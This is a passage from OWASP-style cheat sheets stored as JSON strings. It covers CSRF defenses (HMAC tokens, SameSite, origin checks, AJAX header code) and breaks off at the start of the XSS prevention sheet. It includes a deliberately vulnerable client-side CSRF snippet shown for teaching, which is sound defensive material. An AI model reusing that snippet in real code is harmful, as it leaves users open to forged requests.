uses a secret key known only to the server. This ensures that an attacker cannot create and inject their own, known, CSRF token into the victim's authenticated session. The system's tokens should be secured by hashing or encrypting them.\r\n\r\nWe strongly recommend that you use the Hash-based Message Authentication (HMAC) algorithm because it is less computationally intensive than encrypting and decrypting the cookie. You should also bind the CSRF token with the user's current session to even further enhance security.\r\n\r\n##### Employing HMAC CSRF Tokens\r\n\r\nTo generate HMAC CSRF tokens (with a session-dependent user value), the system must have:\r\n\r\n- **A session-dependent value that changes with each login session**. This value should only be valid for the entirety of the users authenticated session. Avoid using static values like the user's email or ID, as they are not secure ([1](https://stackoverflow.com/a/8656417) | [2](https://stackoverflow.com/a/30539335) | [3](https://security.stackexchange.com/a/22936)). It's worth noting that updating the CSRF token too frequently, such as for each request, is a misconception that assumes it adds substantial security while actually harming the user experience ([1](https://security.stackexchange.com/a/22936)). For example, you could choose one of the following session-dependent values:\r\n- The server-side session ID (e.g. [PHP](https://www.php.net/manual/en/function.session-start.php) or [ASP.NET](<https://learn.microsoft.com/en-us/previous-versions/aspnet/ms178581(v=vs.100)>)).\r\n- A random value (e.g. UUID) within a JWT that changes every time a JWT is created.\r\n- **A secret cryptographic key** Not to confuse with the random value from the naive implementation. This value is used to generate the HMAC hash. Ideally, store this key as an environment variable.\r\n- **A random value for anti-collision purposes**. Generate a random value (preferably cryptographically random) to ensure that consecutive calls within the same second do not produce the same hash ([1](https://github.com/data-govt-nz/ckanext-security/issues/23#issuecomment-479752531)).\r\n\r\n**Should Timestamps be Included in CSRF Tokens for Expiration?**\r\n\r\nIt's a common misconception to include timestamps as a value to specify the CSRF token expiration time. A CSRF Token is not an access token. They are used to verify the authenticity of requests throughout a session, using session information. A new session should generate a new token ([1](https://stackoverflow.com/a/30539335)).\r\n\r\n##### Pseudo-Code For Implementing HMAC CSRF Tokens\r\n\r\nBelow is an example in pseudo-code that demonstrates the implementation steps described above:\r\n\r\n```code\r\n// Gather the values\r\nsecret = readEnvironmentVariable(\"CSRF_SECRET\") // HMAC secret key\r\nsessionID = session.sessionID // Current authenticated user session\r\nrandomValue = cryptographic.randomValue() // Cryptographic random value\r\n\r\n// Create the CSRF Token\r\nmessage = sessionID + \"!\" + randomValue // HMAC message payload\r\nhmac = hmac(\"SHA256\", secret, message) // Generate the HMAC hash\r\ncsrfToken = hmac + \".\" + message // Combine HMAC hash with message to generate the token. The plain message is required to later authenticate it against its HMAC hash\r\n\r\n// Store the CSRF Token in a cookie\r\nresponse.setCookie(\"csrf_token=\" + csrfToken + \"; Secure) // Set Cookie without HttpOnly flag\r\n```\r\n\r\n### Naive Double-Submit Cookie Pattern (DISCOURAGED)\r\n\r\nThe _Naive Double-Submit Cookie_ method is a scalable and easy-to-implement technique which uses a cryptographically strong random value as a cookie and as a request parameter (even before user authentication). Then the server verifies if the cookie value and request value match. The site must require that every transaction request from the user includes this random value as a hidden form value or inside the request header. If the value matches at server side, the server accepts it as a legitimate request and if they don't, it rejects the request.\r\n\r\nSince an attacker is unable to access the cookie value during a cross-site request, they cannot include a matching value in the hidden form value or as a request parameter/header.\r\n\r\nThough the Naive Double-Submit Cookie method is a good initial step to counter CSRF, it still remains vulnerable to certain attacks. [This resource](https://owasp.org/www-chapter-london/assets/slides/David_Johansson-Double_Defeat_of_Double-Submit_Cookie.pdf) provides more information on some vulnerabilities. Thus, we strongly recommend that you use the _Signed Double-Submit Cookie_ pattern.\r\n\r\n### Employing Custom Request Headers for AJAX/API\r\n\r\nBoth the synchronizer token and the double-submit cookie are used to prevent forgery of form data, but they can be tricky to implement and degrade usability. Many modern web applications do not use `<form>` tags. A user-friendly defense that is particularly well suited for AJAX or API endpoints is the use of a **custom request header**. No token is needed for this approach.\r\n\r\nIn this pattern, the client appends a custom header to requests that require CSRF protection. The header can be any arbitrary key-value pair, as long as it does not conflict with existing headers.\r\n\r\n```\r\nX-YOURSITE-CSRF-PROTECTION=1\r\n```\r\n\r\nWhen handling the request, the API checks for the existence of this header. If the header does not exist, the backend rejects the request as potential forgery. This approach has several advantages:\r\n\r\n- UI changes are not required\r\n- no server state is introduced to track tokens\r\n\r\nIf you use `<form>` tags anywhere in your client, you will still need to protect them with alternate approaches described in this document such as tokens.\r\n\r\nThis defense relies on the browser's [same-origin policy (SOP)](https://en.wikipedia.org/wiki/Same-origin_policy) restriction that only JavaScript can be used to add a custom header, and only within its origin. By default, browsers do not allow JavaScript to make cross origin requests with custom headers. Only JavaScript that you serve from your origin can add these headers.\r\n\r\n#### Custom Headers and CORS\r\n\r\nCookies are not set on cross-origin requests (CORS) by default. To enable cookies on an API, you will set `Access-Control-Allow-Credentials=true`. The browser will reject any response that includes `Access-Control-Allow-Origin=*` if credentials are allowed. To allow CORS requests, but protect against CSRF, you need to make sure the server only whitelists a few select origins that you definitively control via the `Access-Control-Allow-Origin` header. Any cross-origin request from an allowed domain will be able to set custom headers.\r\n\r\nAs an example, you might configure your backend to allow CORS with cookies from `http://www.yoursite.com` and `http://mobile.yoursite.com`, so that the only possible preflight responses are:\r\n\r\n```\r\nAccess-Control-Allow-Origin=http://mobile.yoursite.com\r\nAccess-Control-Allow-Credentials=true\r\n```\r\n\r\nor\r\n\r\n```\r\nAccess-Control-Allow-Origin=http://www.yoursite.com\r\nAccess-Control-Allow-Credentials=true\r\n```\r\n\r\nA less secure configuration would be to configure your backend server to allow CORS from all subdomains of your site using a regular expression. If an attacker is able to [take over a subdomain](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover) (not uncommon with cloud services) your CORS configuration would allow them to bypass the same origin policy and forge a request with your custom header.\r\n\r\n## Dealing with Client-Side CSRF Attacks (IMPORTANT)\r\n\r\n[Client-side CSRF](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/csrf.html#client-side-csrf) is a new variant of CSRF attacks where the attacker tricks the client-side JavaScript code to send a forged HTTP request to a vulnerable target site by manipulating the program’s input parameters. Client-side CSRF originates when the JavaScript program uses attacker-controlled inputs, such as the URL, for the generation of asynchronous HTTP requests.\r\n\r\n**Note:** These variants of CSRF are particularly important as they can bypass some of the common anti-CSRF countermeasures like [token-based mitigations](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation) and [SameSite cookies](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute). For example, when [synchronizer tokens](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern) or [custom HTTP request headers](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#use-of-custom-request-headers) are used, the JavaScript program will include them in the asynchronous requests. Also, web browsers will include cookies in same-site request contexts initiated by JavaScript programs, circumventing the [SameSite cookie policies](https://soheilkhodayari.github.io/same-site-wiki/docs/policies/overview.html).\r\n\r\n**Client-Side vs. Classical CSRF:** In the classical CSRF model, the server-side program is the most vulnerable component, because it cannot distinguish whether the incoming authenticated request was performed **intentionally**, also known as the confused deputy problem. In the client-side CSR model, the most vulnerable component is the client-side JavaScript program because an attacker can use it to generate arbitrary asynchronous requests by manipulating the request endpoint and/or its parameters. Client-side CSRF is due to an input validation problem and it reintroduces the confused deputy flaw, that is, the server-side won't, again, be able to distinguish if the request was performed intentionally or not.\r\n\r\nFor more information about client-side CSRF vulnerabilities, see Sections 2 and 5 of this [paper](https://www.usenix.org/system/files/sec21-khodayari.pdf), the [CSRF chapter](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/csrf.html) of the [SameSite wiki](https://soheilkhodayari.github.io/same-site-wiki), and [this post](https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/) by the [Facebook Whitehat program](https://www.facebook.com/whitehat).\r\n\r\n### Client-side CSRF Example\r\n\r\nThe following code snippet demonstrates a simple example of a client-side CSRF vulnerability.\r\n\r\n```html\r\n<script type=\"text/javascript\">\r\n    var csrf_token = document.querySelector(\"meta[name='csrf-token']\").getAttribute(\"content\");\r\n    function ajaxLoad(){\r\n        // process the URL hash fragment\r\n        let hash_fragment = window.location.hash.slice(1);\r\n\r\n        // hash fragment should be of the format: /^(get|post);(.*)$/\r\n        // e.g., https://site.com/index/#post;/profile\r\n        if(hash_fragment.length > 0 && hash_fragment.indexOf(';') > 0 ){\r\n\r\n            let params = hash_fragment.match(/^(get|post);(.*)$/);\r\n            if(params && params.length){\r\n                let request_method = params[1];\r\n                let request_endpoint = params[3];\r\n\r\n                fetch(request_endpoint, {\r\n                    method: request_method,\r\n                    headers: {\r\n                        'XSRF-TOKEN': csrf_token,\r\n                        // [...]\r\n                    },\r\n                    // [...]\r\n                }).then(response => { /* [...] */ });\r\n            }\r\n        }\r\n    }\r\n    // trigger the async request on page load\r\n    window.onload = ajaxLoad();\r\n </script>\r\n```\r\n\r\n**Vulnerability:** In this snippet, the program invokes a function `ajaxLoad()` upon the page load, which is responsible for loading various webpage elements. The function reads the value of the [URL hash fragment](https://developer.mozilla.org/en-US/docs/Web/API/Location/hash) (line 4), and extracts two pieces of information from it (i.e., request method and endpoint) to generate an asynchronous HTTP request (lines 11-13). The vulnerability occurs in lines 15-22, when the JavaScript program uses URL fragments to obtain the server-side endpoint for the asynchronous HTTP request (line 15) and the request method. However, both inputs can be controlled by web attackers, who can pick the value of their choosing, and craft a malicious URL containing the attack payload.\r\n\r\n**Attack:** Usually, attackers share a malicious URL with the victim (through elements such as spear-phishing emails) and because the malicious URL appears to be from an honest, reputable (but vulnerable) website, the user often clicks on it. Alternatively, the attackers can create an attack page to abuse browser APIs (e.g., the [`window.open()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) API) and trick the vulnerable JavaScript of the target page to send the HTTP request, which closely resemles the attack model of the classical CSRF attacks.\r\n\r\nFor more examples of client-side CSRF, see [this post](https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/) by the [Facebook Whitehat program](https://www.facebook.com/whitehat) and this USENIX Security [paper](https://www.usenix.org/system/files/sec21-khodayari.pdf).\r\n\r\n### Client-side CSRF Mitigation Techniques\r\n\r\n**Independent Requests:** Client-side CSRF can be prevented when asynchronous requests cannot be generated via attacker controllable inputs, such as the [URL](https://developer.mozilla.org/en-US/docs/Web/API/Window/location), [window name](https://developer.mozilla.org/en-US/docs/Web/API/Window/name), [document referrer](https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer), and [postMessages](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), to name only a few examples.\r\n\r\n**Input Validation:** Achieving complete isolaion between inputs and request parameters may not always be possible depending on the context and functionality. In these cases, input validation checks has to be implemented. These checks should strictly assess the format and choice of the values of the request parameters and decide whether they can only be used in non-state-changing operations (e.g., only allow GET requests and endpoints starting with a predefined prefix).\r\n\r\n**Predefined Request Data:** Another mitigation technique is to store a list of predefined, safe request data in the JavaScript code (e.g., combinations of endpoints, request methods and other parameters that are safe to be replayed). The program can then use a switch parameter in the URL fragment to decide which entry of the list should each JavaScript function use.\r\n\r\n## Defense In Depth Techniques\r\n\r\n### SameSite (Cookie Attribute)\r\n\r\nSameSite is a cookie attribute (similar to HTTPOnly, Secure etc.) which aims to mitigate CSRF attacks. It is defined in [RFC6265bis](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7). This attribute helps the browser decide whether to send cookies along with cross-site requests. Possible values for this attribute are `Lax`, `Strict`, or `None`.\r\n\r\nThe Strict value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link. For example, if a GitHub-like website uses the Strict value, a logged-in GitHub user who tries to follow a link to a private GitHub project posted on a corporate discussion forum or email, the user will not be able to access the project because GitHub will not receive a session cookie. Since a bank website would not allow any transactional pages to be linked from external sites, so the Strict flag would be most appropriate for banks.\r\n\r\nIf a website wants to maintain a user's logged-in session after the user arrives from an external link, SameSite's default Lax value provides a reasonable balance between security and usability. If the GitHub scenario above uses a Lax value instead, the session cookie would be allowed when following a regular link from an external website while blocking it in CSRF-prone request methods such as POST. Only cross-site-requests that are allowed in Lax mode have top-level navigations and use [safe](https://tools.ietf.org/html/rfc7231#section-4.2.1) HTTP methods.\r\n\r\nFor more details on the `SameSite` values, check the following [section](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7.1) from the [rfc](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02).\r\n\r\nExample of cookies using this attribute:\r\n\r\n```text\r\nSet-Cookie: JSESSIONID=xxxxx; SameSite=Strict\r\nSet-Cookie: JSESSIONID=xxxxx; SameSite=Lax\r\n```\r\n\r\nAll desktop browsers and almost all mobile browsers now support the `SameSite` attribute. To track the browsers implementing it and know how the attribute is used, refer to the following [service](https://caniuse.com/#feat=same-site-cookie-attribute). Note that Chrome has [announced](https://blog.chromium.org/2019/10/developers-get-ready-for-new.html) that they will mark cookies as `SameSite=Lax` by default from Chrome 80 (due in February 2020), and Firefox and Edge are both planning to follow suit. Additionally, the `Secure` flag will be required for cookies that are marked as `SameSite=None`.\r\n\r\nIt is important to note that this attribute should be implemented as an additional layer _defense in depth_ concept. This attribute protects the user through the browsers supporting it, and it contains as well 2 ways to bypass it as mentioned in the following [section](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7.1). This attribute should not replace a CSRF Token. Instead, it should co-exist with that tokento protect  the user in a more robust way.\r\n\r\n### Using Standard Headers to Verify Origin\r\n\r\nThere are two steps to this mitigation method, both of which examine an HTTP request header value:\r\n\r\n1. Determine the origin that the request is coming from (source origin). Can be done via Origin or Referer headers.\r\n2. Determining the origin that the request is going to (target origin).\r\n\r\nAt server-side, we verify if both of them match. If they do, we accept the request as legitimate (meaning it's the same origin request) and if they don't, we discard the request (meaning that the request originated from cross-domain). Reliability on these headers comes from the fact that they cannot be altered programmatically as they fall under [forbidden headers](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name) list, meaning that only the browser can set them.\r\n\r\n#### Identifying Source Origin (via Origin/Referer Header)\r\n\r\n##### Checking the Origin Header\r\n\r\nIf the Origin header is present, verify that its value matches the target origin. Unlike the referer, the Origin header will be present in HTTP requests that originate from an HTTPS URL.\r\n\r\n##### Checking the Referer Header if Origin Header Is Not Present\r\n\r\nIf the Origin header is not present, verify that the hostname in the Referer header matches the target origin. This method of CSRF mitigation is also commonly used with unauthenticated requests, such as requests made prior to establishing a session state, which is required to keep track of a synchronization token.\r\n\r\nIn both cases, make sure the target origin check is strong. For example, if your site is `example.org` make sure `example.org.attacker.com` does not pass your origin check (i.e, match through the trailing / after the origin to make sure you are matching against the entire origin).\r\n\r\nIf neither of these headers are present, you can either accept or block the request. We recommend **blocking**. Alternatively, you might want to log all such instances, monitor their use cases/behavior, and then start blocking requests only after you get enough confidence.\r\n\r\n#### Identifying the Target Origin\r\n\r\nGenerally, it's not always easy to determine the target origin. You are not always able to simply grab the target origin (i.e., its hostname and port `#`) from the URL in the request, because the application server is frequently sitting behind one or more proxies. This means that the original URL can be different from the URL the app server actually receives. However, your application server is directly accessed by its users, then using the origin in the URL is fine and you're all set.\r\n\r\nIf you are behind a proxy, there are a number of options to consider.\r\n\r\n- **Configure your application to simply know its target origin:** Since it is your application, so you can find its target origin and set that value in some server configuration entry. This would be the most secure approach as its defined server side, so it is a trusted value. However, this might be problematic to maintain if your application is deployed in many places, e.g., dev, test, QA, production, and possibly multiple production instances. Setting the correct value for each of these situations might be difficult, but if you can do it via some central configuration and providing your instances to grab value from it, that's great! (**Note:** Make sure the centralized configuration store is maintained securely because major part of your CSRF defense depends on it.)\r\n- **Use the Host header value:** If you want your application to find its own target so it doesn't have to be configured for each deployed instance, we recommend using the Host family of headers. The Host header is meant to contain the target origin of the request. But, if your app server is sitting behind a proxy, the Host header value is most likely changed by the proxy to the target origin of the URL behind the proxy, which is different than the original URL. This modified Host header origin won't match the source origin in the original Origin or Referer headers.\r\n- **Use the X-Forwarded-Host header value:** To avoid the possibility that the proxy will alter the host header, you can use another header called X-Forwarded-Host to contain the original Host header value the proxy received. Most proxies will pass along the original Host header value in the X-Forwarded-Host header. So the value in X-Forwarded-Host is likely to be the target origin value that you need to compare to the source origin in the Origin or Referer header.\r\n\r\nUsing this header value for mitigation will work properly when origin or referrer headers are present in the requests. Though these headers are included **majority** of the time, there are few use cases where they are not included (most of them are for legitimate reasons to safeguard users privacy/to tune to browsers ecosystem).\r\n\r\n**Use cases where X-Forward-Host is not employed:**\r\n\r\n- In an instance following a [302 redirect cross-origin](https://stackoverflow.com/questions/22397072/are-there-any-browsers-that-set-the-origin-header-to-null-for-privacy-sensitiv), Origin is not included in the redirected request because that may be considered sensitive information that should not be sent to the other origin.\r\n- There are some [privacy contexts](https://wiki.mozilla.org/Security/Origin#Privacy-Sensitive_Contexts) where Origin is set to \"null\" For example, see the following [here](https://www.google.com/search?q=origin+header+sent+null+value+site%3Astackoverflow.com&oq=origin+header+sent+null+value+site%3Astackoverflow.com).\r\n- Origin header is included for all cross origin requests but for same origin requests, in most browsers it is only included in POST/DELETE/PUT **Note:** Although it is not ideal, many developers use GET requests to do state changing operations.\r\n- Referer header is no exception. There are multiple use cases where referrer header is omitted as well ([1](https://stackoverflow.com/questions/6880659/in-what-cases-will-http-referer-be-empty), [2](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer), [3](https://en.wikipedia.org/wiki/HTTP_referer#Referer_hiding), [4](https://seclab.stanford.edu/websec/csrf/csrf.pdf) and [5](https://www.google.com/search?q=referrer+header+sent+null+value+site:stackoverflow.com)). Load balancers, proxies and embedded network devices are also well known to strip the referrer header due to privacy reasons in logging them.\r\n\r\nUsually, a minor percentage of traffic does fall under above categories ([1-2%](http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html)) and no enterprise would want to lose this traffic. One of the popular technique used across the Internet to make this technique more usable is to accept the request if the Origin/referrer matches your configured list of domains \"OR\" a null value (Examples [here](http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html). The null value is to cover the edge cases mentioned above where these headers are not sent). Please note that, attackers can exploit this but people prefer to use this technique as a defense in depth measure because of the minor effort involved in deploying it.\r\n\r\n#### Using Cookies with Host Prefixes to Identify Origins\r\n\r\nAnother solution for this problem is using `Cookie Prefixes` for cookies with CSRF tokens. If cookies have `__Host-` prefixes e.g. `Set-Cookie: __Host-token=RANDOM; path=/; Secure` then each cookie:\r\n\r\n- Cannot be (over)written from another subdomain.\r\n- Must have the path of `/`.\r\n- Must be marked as Secure (i.e, cannot be sent over unencrypted HTTP).\r\n\r\nAs of July 2020 cookie prefixes [are supported by all major browsers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility).\r\n\r\nSee the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) and [IETF Draft](https://tools.ietf.org/html/draft-west-cookie-prefixes-05) for further information about cookie prefixes.\r\n\r\n### User Interaction-Based CSRF Defense\r\n\r\nWhile all the techniques referenced here do not require any user interaction, sometimes it's easier or more appropriate to involve the user in the transaction to prevent unauthorized operations (forged via CSRF or otherwise). The following are some examples of techniques that can act as strong CSRF defense when implemented correctly.\r\n\r\n- ~~Re-Authentication~~Authorization mechanisms (password or stronger)\r\n- One-time Tokens\r\n- CAPTCHA (prefer newer CAPTCHA versions without user interaction or visual pattern matching)\r\n\r\nWhile these are very strong CSRF defenses, it can create a significant impact on the user experience. As such, they would generally only be used for security critical operations (such as password changes, money transfers, etc.), alongside the other defences discussed in this cheat sheet.\r\n\r\n## Possible CSRF Vulnerabilities in Login Forms\r\n\r\nMost developers tend to ignore CSRF vulnerabilities on login forms as they assume that CSRF would not be applicable on login forms because user is not authenticated at that stage, however this assumption is not always true. CSRF vulnerabilities can still occur on login forms where the user is not authenticated, but the impact and risk is different.\r\n\r\nFor example, if an attacker uses CSRF to assume an authenticated identity of a target victim on a shopping website using the attacker's account, and the victim then enters their credit card information, an attacker may be able to purchase items using the victim's stored card details. For more information about login CSRF and other risks, see section 3 of [this](https://seclab.stanford.edu/websec/csrf/csrf.pdf) paper.\r\n\r\nLogin CSRF can be mitigated by creating pre-sessions (sessions before a user is authenticated) and including tokens in login form. You can use any of the techniques mentioned above to generate tokens. Remember that pre-sessions cannot be transitioned to real sessions once the user is authenticated - the session should be destroyed and a new one should be made to avoid [session fixation attacks](http://www.acrossecurity.com/papers/session_fixation.pdf). This technique is described in [Robust Defenses for Cross-Site Request Forgery section 4.1](https://seclab.stanford.edu/websec/csrf/csrf.pdf).\r\n\r\n## REFERENCE: Sample JEE Filter Demonstrating CSRF Protection\r\n\r\nThe following [JEE web filter](https://github.com/righettod/poc-csrf/blob/master/src/main/java/eu/righettod/poccsrf/filter/CSRFValidationFilter.java) provides an example reference for some of the concepts described in this cheatsheet. It implements the following stateless mitigations ([OWASP CSRFGuard](https://github.com/aramrami/OWASP-CSRFGuard), cover a stateful approach).\r\n\r\n- Verifying same origin with standard headers\r\n- Double submit cookie\r\n- SameSite cookie attribute\r\n\r\n**Please note** that this is only a reference sample and is not complete (for example: it doesn't have a block to direct the control flow when origin and referrer header check succeeds nor it has a port/host/protocol level validation for referrer header). Developers are recommended to build their complete mitigation on top of this reference sample. Developers should also implement authentication and authorization mechanisms before checking for CSRF is considered effective.\r\n\r\nFull source is located [here](https://github.com/righettod/poc-csrf) and provides a runnable POC.\r\n\r\n## JavaScript: Automatically Including CSRF Tokens as an AJAX Request Header\r\n\r\nThe following guidance for JavaScript by default considers **GET**, **HEAD** and **OPTIONS** methods as safe operations. Therefore **GET**, **HEAD**, and **OPTIONS** method AJAX calls need not be appended with a CSRF token header. However, if the verbs are used to perform state changing operations, they will also require a CSRF token header (although this is a bad practice, and should be avoided).\r\n\r\nThe **POST**, **PUT**, **PATCH**, and **DELETE** methods, being state changing verbs, should have a CSRF token attached to the request. The following guidance will demonstrate how to create overrides in JavaScript libraries to have CSRF tokens included automatically with every AJAX request for the state changing methods mentioned above.\r\n\r\n### Storing the CSRF Token Value in the DOM\r\n\r\nA CSRF token can be included in the `<meta>` tag as shown below. All subsequent calls in the page can extract the CSRF token from this `<meta>` tag. It can also be stored in a JavaScript variable or anywhere on the DOM. However, it is not recommended to store the CSFR token in cookies or browser local storage.\r\n\r\nThe following code snippet can be used to include a CSRF token as a `<meta>` tag:\r\n\r\n```html\r\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">\r\n```\r\n\r\nThe exact syntax of populating the content attribute would depend on your web application's backend programming language.\r\n\r\n### Overriding Defaults to Set Custom Header\r\n\r\nSeveral JavaScript libraries allow you to overriding default settings to have a header added automatically to all AJAX requests.\r\n\r\n#### XMLHttpRequest (Native JavaScript)\r\n\r\nXMLHttpRequest's open() method can be overridden to set the `anti-csrf-token` header whenever the `open()` method is invoked next. The function `csrfSafeMethod()` defined below will filter out the safe HTTP methods and only add the header to unsafe HTTP methods.\r\n\r\nThis can be done as demonstrated in the following code snippet:\r\n\r\n```html\r\n<script type=\"text/javascript\">\r\n    var csrf_token = document.querySelector(\"meta[name='csrf-token']\").getAttribute(\"content\");\r\n    function csrfSafeMethod(method) {\r\n        // these HTTP methods do not require CSRF protection\r\n        return (/^(GET|HEAD|OPTIONS)$/.test(method));\r\n    }\r\n    var o = XMLHttpRequest.prototype.open;\r\n    XMLHttpRequest.prototype.open = function(){\r\n        var res = o.apply(this, arguments);\r\n        var err = new Error();\r\n        if (!csrfSafeMethod(arguments[0])) {\r\n            this.setRequestHeader('anti-csrf-token', csrf_token);\r\n        }\r\n        return res;\r\n    };\r\n </script>\r\n```\r\n\r\n#### AngularJS\r\n\r\nAngularJS allows for setting default headers for HTTP operations. Further documentation can be found at AngularJS's documentation for [$httpProvider](https://docs.angularjs.org/api/ng/provider/$httpProvider#defaults).\r\n\r\n```html\r\n<script>\r\n    var csrf_token = document.querySelector(\"meta[name='csrf-token']\").getAttribute(\"content\");\r\n\r\n    var app = angular.module(\"app\", []);\r\n\r\n    app.config(['$httpProvider', function ($httpProvider) {\r\n        $httpProvider.defaults.headers.post[\"anti-csrf-token\"] = csrf_token;\r\n        $httpProvider.defaults.headers.put[\"anti-csrf-token\"] = csrf_token;\r\n        $httpProvider.defaults.headers.patch[\"anti-csrf-token\"] = csrf_token;\r\n        // AngularJS does not create an object for DELETE and TRACE methods by default, and has to be manually created.\r\n        $httpProvider.defaults.headers.delete = {\r\n            \"Content-Type\" : \"application/json;charset=utf-8\",\r\n            \"anti-csrf-token\" : csrf_token\r\n        };\r\n        $httpProvider.defaults.headers.trace = {\r\n            \"Content-Type\" : \"application/json;charset=utf-8\",\r\n            \"anti-csrf-token\" : csrf_token\r\n        };\r\n      }]);\r\n </script>\r\n```\r\n\r\nThis code snippet has been tested with AngularJS version 1.7.7.\r\n\r\n#### Axios\r\n\r\n[Axios](https://github.com/axios/axios) allows us to set default headers for the POST, PUT, DELETE and PATCH actions.\r\n\r\n```html\r\n<script type=\"text/javascript\">\r\n    var csrf_token = document.querySelector(\"meta[name='csrf-token']\").getAttribute(\"content\");\r\n\r\n    axios.defaults.headers.post['anti-csrf-token'] = csrf_token;\r\n    axios.defaults.headers.put['anti-csrf-token'] = csrf_token;\r\n    axios.defaults.headers.delete['anti-csrf-token'] = csrf_token;\r\n    axios.defaults.headers.patch['anti-csrf-token'] = csrf_token;\r\n\r\n    // Axios does not create an object for TRACE method by default, and has to be created manually.\r\n    axios.defaults.headers.trace = {}\r\n    axios.defaults.headers.trace['anti-csrf-token'] = csrf_token\r\n</script>\r\n```\r\n\r\nThis code snippet has been tested with Axios version 0.18.0.\r\n\r\n#### JQuery\r\n\r\nJQuery exposes an API called `$.ajaxSetup()` which can be used to add the `anti-csrf-token` header to the AJAX request. API documentation for `$.ajaxSetup()` can be found here. The function `csrfSafeMethod()` defined below will filter out the safe HTTP methods and only add the header to unsafe HTTP methods.\r\n\r\nYou can configure jQuery to automatically add the token to all request headers by adopting the following code snippet. This provides a simple and convenient CSRF protection for your AJAX based applications:\r\n\r\n```html\r\n<script type=\"text/javascript\">\r\n    var csrf_token = $('meta[name=\"csrf-token\"]').attr('content');\r\n\r\n    function csrfSafeMethod(method) {\r\n        // these HTTP methods do not require CSRF protection\r\n        return (/^(GET|HEAD|OPTIONS)$/.test(method));\r\n    }\r\n\r\n    $.ajaxSetup({\r\n        beforeSend: function(xhr, settings) {\r\n            if (!csrfSafeMethod(settings.type) && !this.crossDomain) {\r\n                xhr.setRequestHeader(\"anti-csrf-token\", csrf_token);\r\n            }\r\n        }\r\n    });\r\n</script>\r\n```\r\n\r\nThis code snippet has been tested with jQuery version 3.3.1.\r\n\r\n## References in Related Cheat Sheets\r\n\r\n### CSRF\r\n\r\n- [OWASP Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)\r\n- [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf)\r\n- [Mozilla Web Security Cheat Sheet](https://infosec.mozilla.org/guidelines/web_security#csrf-prevention)\r\n- [Common CSRF Prevention Misconceptions](https://medium.com/keylogged/common-csrf-prevention-misconceptions-67fd026d94a8)\r\n- [Robust Defenses for Cross-Site Request Forgery](https://seclab.stanford.edu/websec/csrf/csrf.pdf)\r\n- For Java: OWASP [CSRF Guard](https://owasp.org/www-project-csrfguard/) or [Spring Security](https://docs.spring.io/spring-security/site/docs/5.5.x-SNAPSHOT/reference/html5/#csrf)\r\n- For PHP and Apache: [CSRFProtector Project](https://github.com/OWASP/www-project-csrfprotector )\r\n- For AngularJS: [Cross-Site Request Forgery (XSRF) Protection](https://docs.angularjs.org/api/ng/service/$http#cross-site-request-forgery-xsrf-protection)\r\n"
    },
    {
      "Cross_Site_Scripting_Prevention_Cheat_Sheet.md": "# Cross Site Scripting Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet helps developers prevent XSS vulnerabilities.\r\n\r\nCross-Site Scripting (XSS) is a misnomer. Originally this term was derived from early versions of the attack that were primarily focused on stealing data cross-site. Since then, the term has widened to include injection of basically any content. XSS attacks are serious and can lead to account impersonation, observing user behaviour, loading external content, stealing sensitive data, and more.\r\n\r\n**This cheatsheet contains techniques to prevent or limit the impact of XSS. Since no single technique will solve XSS, using the right combination of defensive techniques will be necessary to prevent XSS.**\r\n\r\n## Framework Security\r\n\r\nFortunately, applications built with modern web frameworks have fewer XSS bugs, because these frameworks steer developers towards good security practices and help mitigate XSS by using templating, auto-escaping, and more. However, developers need to know that problems can occur if frameworks are used insecurely, such as:\r\n\r\n- _escape hatches_ that frameworks use to directly manipulate the DOM\r\n- React’s `dangerouslySetInnerHTML` without sanitising the HTML\r\n- React cannot handle `javascript:` or `data:` URLs without specialized validation\r\n- Angular’s `bypassSecurityTrustAs*` functions\r\n- Template injection\r\n- Out of date framework plugins or components\r\n- and more\r\n\r\nWhen you use a modern web framework, you need to know how your framework prevents XSS and where it has gaps. There will be times where you need to do something outside the protection provided by your framework, which means that Output Encoding and HTML Sanitization can be critical. OWASP will be producing framework specific cheatsheets for React, Vue, and Angular.\r\n\r\n## XSS Defense Philosophy\r\n\r\nIn order for an XSS attack to be successful, an attacker must be able to to insert and execute malicious content in a webpage. Thus, all variables in a web application needs to be protected. Ensuring that **all variables** go through validation and are then escaped or sanitized is known as **perfect injection resistance**. Any variable that does not go through this process is a potential weakness. Frameworks make it easy to ensure variables are correctly validated and escaped or sanitised.\r\n\r\nHowever, no framework is perfect and security gaps still exist in popular frameworks like React and Angular. Output encoding and HTML sanitization help address those gaps.\r\n\r\n## Output Encoding\r\n\r\nWhen you need to 